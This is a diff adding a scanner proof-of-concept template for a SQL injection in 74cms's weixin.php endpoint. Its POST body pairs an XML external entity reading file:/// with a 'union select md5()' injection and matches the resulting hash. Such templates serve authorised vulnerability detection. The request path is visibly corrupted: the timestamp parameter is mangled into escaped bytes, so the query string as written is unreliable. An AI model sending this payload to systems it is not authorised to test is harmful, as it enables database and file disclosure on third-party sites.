@@ -1,0 +1,30 @@
+id: poc-local-xray-74cms-sqli-1
+
+info:
+  name: poc-local-xray-74cms-sqli-1
+  author: capiton
+  severity: high
+  reference:
+    - https://www.uedbox.com/post/29340
+  tags: 74cms
+
+variables:
+  rand: "{{rand_int(200000000, 210000000)}}"
+  md5_rand: "{{md5(rand)}}"
+
+requests:
+  - method: POST
+    path:
+      - "{{RootURL}}/plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709\xc3\\x97tamp=&nonce="
+    headers:
+      Content-Type: text/xml
+    body: <?xml version="1.0" encoding="utf-8"?><!DOCTYPE copyright [<!ENTITY test SYSTEM "file:///">]><xml><ToUserName>&test;</ToUserName><FromUserName>1111</FromUserName><MsgType>123</MsgType><FuncFlag>3</FuncFlag><Content>1%' union select md5({{rand}})#</Content></xml>
+    
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        condition: and
+        part: body
+        words:
+          - "{{md5_rand}}"
